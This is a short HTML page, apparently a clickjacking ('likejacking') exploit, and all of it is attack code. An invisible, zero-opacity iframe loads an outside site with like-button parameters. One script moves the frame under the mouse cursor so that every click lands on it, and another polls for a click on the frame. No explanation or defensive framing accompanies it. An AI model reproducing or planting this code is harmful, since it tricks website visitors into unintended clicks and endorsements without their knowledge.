<!DOCTYPE html>
<html><head><title>Document</title></head>
<body>
<div id="icontainer" style="overflow:hidden;width:20px;height:20px;position:absolute;opacity:0.0;">
<iframe allowtransparency="true" frameborder="0" id="haframe" name="haframe" scrolling="no" src="http://www.cebr.info?href=http://www.cebr.info&layout=standard&show_faces=false&width=20&action=like&font=tahoma"></iframe>
</div>
<script>
var interval;
window.addEventListener("load", function() {
  interval = setInterval("updateActiveElement();", 50);
});
function updateActiveElement() {
  if (document.activeElement && document.activeElement.getAttribute("id") == "haframe") {
    clearInterval(interval);
  }
}
</script>
<script>
var icontainer = document.getElementById("icontainer");
document.onmousemove = function(e) {
  icontainer.style.top = (e.pageY - 10) + "px";
  icontainer.style.left = (e.pageX - 10) + "px";
};
</script>
</body></html>
